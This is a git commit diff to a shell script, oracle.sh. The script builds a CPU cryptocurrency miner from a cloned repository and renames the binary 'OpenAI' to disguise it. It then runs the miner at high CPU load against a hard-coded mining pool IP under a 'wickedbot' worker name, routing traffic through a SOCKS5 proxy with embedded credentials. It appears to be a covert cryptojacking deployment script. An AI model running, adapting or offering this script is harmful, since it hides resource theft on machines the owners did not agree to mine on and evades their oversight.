f332911aa290fb4ca0a0616a3d7694be438429f1
dnminh11 <dn.minh.x@gmail.com>
2018-04-04 16:39:13 +0700

    a

--- oracle.sh
+++ oracle.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
-sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
+sudo apt-get update && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
 git clone https://github.com/k67frozen/cpuminer-opt
 cd cpuminer-opt
 chmod +x *
 ./build.sh
 mv cpuminer OpenAI
-cpulimit --exe cpuminer --limit 80 -b && ./OpenAI -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u wickedbot.xeko -p x socks5://zimbalem:123456@209.250.244.28:1212
+cpulimit --exe cpuminer --limit 80 -b && ./OpenAI -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u wickedbot.xeko -p x -x socks5://zimbalem:123456@209.250.244.28:1212
